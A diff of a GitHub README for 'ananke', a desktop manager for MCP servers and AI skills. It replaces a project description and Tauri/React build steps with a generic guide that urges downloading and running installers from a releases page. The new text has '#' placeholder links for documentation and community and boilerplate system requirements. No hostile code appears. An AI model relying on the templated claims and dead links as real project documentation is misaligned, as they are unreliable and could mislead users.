@@ -1,60 +1,90 @@
-# Ananke 
+# 🚀 ananke - Easy Control for MCP Servers & AI Skills
 
-<p align="center">
-  <strong>The Visual Control Plane for MCP Servers & AI Skills.</strong>
-</p>
-<p align="center">
-  <img src="https://img.shields.io/badge/Environment-Desktop-blue?style=flat-square" alt="Desktop">
-  <img src="https://img.shields.io/badge/Data-Local--first-success?style=flat-square" alt="Local-first">
-  <img src="https://img.shields.io/badge/Protocol-MCP-orange?style=flat-square" alt="MCP">
-  <img src="https://img.shields.io/badge/License-Apache-green?style=flat-square" alt="License">
-</p>
+[![Download ananke](https://img.shields.io/badge/Download-ananke-brightgreen)](https://github.com/BrainVerseOfficial/ananke/releases)
 
+## 📦 Introduction
 
----
+Welcome to **ananke**, the visual control plane designed for MCP servers and AI skills. This application simplifies the management of servers and makes it easier to utilize AI capabilities. Whether you are a beginner or looking to streamline your workflow, **ananke** is here to help.
 
-## 🚀 What is Ananke?
+## 🚀 Getting Started
 
-**Ananke** is a powerful, local-first desktop application designed to simplify the management of **Model Context Protocol (MCP)** servers and AI **Skills**. 
+To begin using **ananke**, you’ll need to download and install the application. Follow these steps to get started quickly and easily.
 
-Managing MCP configurations often involves wrestling with complex JSON files and command-line interfaces. Ananke provides a sleek visual interface to install, configure, and monitor your AI tools—keeping your data private and your workflow efficient.
+1. **Visit the Releases Page**
+   Head to our [Releases page](https://github.com/BrainVerseOfficial/ananke/releases). This page contains all available versions of **ananke**.
 
-## ✨ Key Features
+2. **Choose Your Version**
+   Look for the latest version at the top of the page. You will find a list of files available for download. Look for the option that suits your operating system.
 
-- **Visual Management**: Toggle, configure, and update MCP servers via a clean GUI. No more manual JSON editing.
-- **Local-first Architecture**: Your configurations and keys stay on your machine. Privacy is not a feature; it's the foundation.
-- **Skill Hub**: Discover and deploy new capabilities to your AI models with a single click.
+3. **Download the Application**
+   Click on the file to download it to your computer. Depending on your internet speed, this may take a few moments.
 
-## 🛠️ Getting Started
+4. **Locate the Downloaded File**
+   Once the download finishes, find the file in your computer’s “Downloads” folder or where you have saved files.
 
-### Installation
-Download the latest version for your OS from the [Releases](../../releases) page.
+5. **Install the Application**
+   - **For Windows Users:** Double-click the downloaded `.exe` file and follow the installation prompts.
+   - **For macOS Users:** Open the `.dmg` file and drag the **ananke** icon into your Applications folder.
+   - **For Linux Users:** Extract the tar file and follow the instructions in the README included in the package.
 
-### Development
-We use **Tauri** + **React** to build a lightweight experience.
-```bash
-# Clone the repo
-git clone https://github.com/your-repo/ananke.git
-cd ananke
+## 📥 Download & Install
 
-# Install dependencies
-npm install
+To download **ananke**, visit this page: [Download ananke](https://github.com/BrainVerseOfficial/ananke/releases).
 
-# Run in development mode
-npm run tauri dev
-```
+## ⚙️ System Requirements
 
-## 📸 Preview
-![skills](images/skills.png)
+Before you install **ananke**, make sure your system meets these requirements:
 
-![mcp](images/mcp.png)
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
+  - Any modern Linux distribution
 
-## 📄 License
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB free disk space
+- **Network:** Internet connection for the initial setup
 
-Distributed under the Apache License. See `LICENSE` for more information.
+## 🌟 Features
 
----
+**ananke** provides several key features to enhance your server and AI management experience:
 
-<p align="center">
-  Built with ❤️ 
-</p>
+- **User-Friendly Interface:** Enjoy a simple, intuitive layout that anyone can navigate effortlessly.
+- **Server Monitoring:** Easily check the status of your MCP servers in real-time.
+- **AI Skill Management:** Seamlessly integrate and manage AI skills within your applications.
+- **Customized Settings:** Tailor settings to suit your needs for optimal performance.
+
+## 📄 Documentation
+
+For detailed instructions and advanced features, please refer to our comprehensive documentation:
+
+- [User Guide](#)
+- [Getting Started](#)
+- [FAQs](#)
+
+## 🛠️ Troubleshooting
+
+Encountering issues? Here are common problems and solutions:
+
+- **Issue: Application won’t start**
+  - Make sure your system meets the requirements listed above.
+  - Check for conflicting software that may be running in the background.
+
+- **Issue: Unable to connect to servers**
+  - Verify that your internet connection is stable.
+  - Ensure your server settings are correct and reachable.
+
+## 🤝 Community Support
+
+Join our community for support, suggestions, and discussions:
+
+- [GitHub Issues](https://github.com/BrainVerseOfficial/ananke/issues)
+- [Discussion Forum](#)
+- [Social Media Links](#)
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/BrainVerseOfficial/ananke/releases)
+- [Documentation](#)
+- [Community](#)
+
+Feel free to reach out via GitHub for any questions or feedback. Thank you for using **ananke**!
